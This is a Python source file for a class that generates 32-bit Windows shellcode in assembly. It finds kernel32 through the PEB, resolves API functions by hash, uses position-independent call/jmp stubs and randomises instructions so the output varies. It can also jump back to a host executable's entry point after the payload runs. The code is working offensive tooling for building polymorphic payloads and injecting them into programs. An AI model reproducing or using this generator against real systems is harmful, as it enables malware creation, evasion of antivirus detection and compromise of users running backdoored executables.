import random
import os
import pefile

class Winx86Engine:

	def __init__(self):
		# Indexing usage of registers 0=free, 1=busy
		self.registers = {'eax':0,'ebx':0,'ecx':0,'edx':0}
		# Position Independent Code
		self.pic = [
			'jmp short Payload\nPayloadReturn:\ns0\nPayload:\ncall PayloadReturn\ns1\n'
		]
		# Contains register that hold kernel32 base address
		self.kernel32 = "edi"
		# Contains the functions to call, like WinExec, ExitProcess etc...
		self.calls = []
		self.hash = []
		self.count = 0x00
		self.returnValue = ""
		# s0 and s1 are used in conjuction with self.pic: s0 contains the shellcode \
		# s1 contains for example 'db "cmd.exe /c calc.exe"' or the encoded shellcode 
		self.s0 = ""
		self.s1 = ""
		self.payload = ""
		self.poly = True
		self.exit = None

		# EAX = return_value
		self.r1 = ['eax']
		self.n1 = 0
		self.registers[self.r1[self.n1]] = 1
		self.returnValue = self.r1[self.n1]

	def header(self):
		self.payload += "global _start\n"
		self.payload += "section .text\n"

	def footer(self):
		self.endMain()

	def startMain(self):
		self.payload += "_start:\n"
		if self.exit == None:
			self.payload += "push ebp\n"
			self.payload += "mov ebp,esp\n"
		else:
			self.payload += "pushad\n"
			self.payload += "pushfd\n"
			self.payload += "mov ebp,esp\n"
			self.payload += "sub ebp,0x04\n"

		self.payload += "sub esp,0x20\n"
		self.payload += "call find_kernel32\n"
		self.payload += "mov [ebp], edi\n"

	def endMain(self):
		if self.exit == None:
			self.payload += "add esp,0x28\n"
			self.payload += "ret\n"
		else:
			self.payload += "nop\n" * 4
			self.payload += "ending:\n"
			self.payload += "add esp,0x28\n"
			self.payload += "popfd\n"
			self.payload += "popad\n"

			if self.template != None:
				exe = self.template
				pe = pefile.PE(exe)
				ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
				ep_ava = ep+pe.OPTIONAL_HEADER.ImageBase
				self.payload += "push "+hex(ep_ava)+"\n"
				self.payload += "ret\n"

	def functionRotation(self):
		self.mainFunction()
		self.kernel32Base()
		self.findFunction(self.kernel32)

	def mainFunction(self, start=1):
		if start == 1:
			self.startMain()
		else:
			self.payload += "_start:\n"

		for c in self.hash:
			self.call_findFunction(c)

		if (self.s0 != "") and (self.s1 != ""):
			tmp = self.pic[0]
			tmp = tmp.replace("s0", self.s0)
			tmp = tmp.replace("s1", self.s1)
			self.payload += tmp

	def call_findFunction(self, call):
		self.count += 0x04
		self.payload += "push" + " " + call + "\n"
		self.payload += "push" + " " + self.kernel32 + "\n"
		self.payload += "call find_function\n"
		self.payload += "mov" + " " + "[ebp+" + hex(self.count) + "]," + self.returnValue + "\n"		

	def zeroingRegister(self, register):
		self.zeroing_registers = [
			'xor %s, %s' % (register,register),
			'sub %s, %s' % (register,register),
			'mov %s, 0' % register,
			'and %s, 0' % register
		]
		n = random.randint(0,len(self.zeroing_registers)-1)
		return self.zeroing_registers[n]

	def mutexRegister(self):
		r1 = [key for key,value in self.registers.items() if value == 0]
		n1 = random.randint(0,len(r1)-1)
		self.registers[r1[n1]] = 1
		return r1[n1]

	def freeRegisters(self, regs):
		for k in regs:
			self.registers[k] = 0

	def kernel32Base(self):
		r = self.mutexRegister()
		self.registers[r] = 1

		parse = r

		self.payload += "find_kernel32:\n"
		self.payload += "mov %s, [FS : 0x30]\n" % parse
		self.payload += "mov %s, [%s + 0x0C]\n" % (parse,parse)
		self.payload += "mov %s, [%s + 0x14]\n" % (parse,parse)
		self.payload += ("mov %s, [%s]\n" % (parse,parse)) * 2
		self.payload += "mov %s, [%s + 0x10]\n" % (self.kernel32,parse)
		self.payload += "ret\n"

		self.registers[r] = 0

	def findFunction(self, kernel32):
		self.payload += "find_function:\n"
		self.payload += "pushad\n"
		self.payload += "mov ebp,%s\n" % kernel32
		self.payload += "mov %s,[ebp+0x3c]\n" % self.r1[self.n1]
		self.payload += "mov %s,[ebp+%s+0x78]\n" % (kernel32,self.r1[self.n1])
		self.payload += "add %s,ebp\n" % kernel32

		r2 = ['ecx']
		n2 = 0
		self.registers[r2[n2]] = 1

		self.payload += "mov %s,[%s+0x18]\n" % (r2[n2],kernel32)

		r3 = ['ebx']
		n3 = 0
		self.registers[r3[n3]] = 1

		self.payload += "mov %s,[%s+0x20]\n" %(r3[n3],kernel32)
		self.payload += "add %s,ebp\n" % r3[n3]
		self.payload += "find_function_loop:\n"
		self.payload += "jecxz find_function_finished\n"
		self.payload += "dec %s\n" % r2[n2]
		self.payload += "mov esi,[%s+%s*4]\n" % (r3[n3],r2[n2])
		self.payload += "add esi,ebp\n"
		self.payload += "compute_hash:\n"
		self.payload += self.zeroingRegister(self.r1[self.n1]) + "\n"
		self.payload += "cdq\n"	
		self.payload += "cld\n"
		self.payload += "compute_hash_again:\n"
		self.payload += "lodsb\n"

		test = self.r1[self.n1][1:2] + "l"

		self.payload += "test %s,%s\n" % (test,test)
		self.payload += "jz compute_hash_finished\n"

		r = self.mutexRegister()
		self.registers[r] = 1

		self.payload += "ror %s,0x0d\n" % r
		self.payload += "add %s,%s\n" % (r,self.r1[self.n1])
		self.payload += "jmp compute_hash_again\n"
		self.payload += "compute_hash_finished:\n"
		self.payload += "find_function_compare:\n"
		self.payload += "cmp %s,[esp+0x28]\n" % r
		self.payload += "jnz find_function_loop\n"
		self.payload += "mov %s,[%s+0x24]\n" % (r3[n3],kernel32)
		self.payload += "add %s,ebp\n" % r3[n3]
		self.payload += "mov %s,[%s+2*%s]\n" % (r2[n2][1:],r3[n3],r2[n2])
		self.payload += "mov %s,[%s+0x1c]\n" % (r3[n3],kernel32)
		self.payload += "add %s,ebp\n" % r3[n3]
		self.payload += "mov %s,[%s+4*%s]\n" % (self.r1[self.n1],r3[n3],r2[n2])
		self.payload += "add %s,ebp\n" % self.r1[self.n1]
		self.payload += "mov [esp+0x1c],%s\n" % self.r1[self.n1]
		self.payload += "find_function_finished:\n"
		self.payload += "popad\n"
		self.payload += "ret\n"

		rs = [r,r2[n2],r3[n3]]
		self.freeRegisters(rs)

	def parseExit(self):
		for arg in self.args:
			for a in arg:
				if "EXITFUNC" in a:
					self.exit = a.split("=")[1]
					return self.exit

	def show(self):
		print(self.payload)

	def write(self, output):
		file = open(output+".asm","w")
		file.write(self.payload)
		file.close()

	def assemble(self, output):
		self.write(output)

		os.system("nasm -fwin32 %s.asm -o %s.o" % (output, output))
		os.remove("%s.asm" % output)
		os.system("i586-mingw32msvc-ld %s.o -o %s.exe --subsystem windows -e _start" % (output, output))

		os.system("objdump -D %s.exe > %s.opcode" % (output, output))
		os.remove("%s.exe" % output)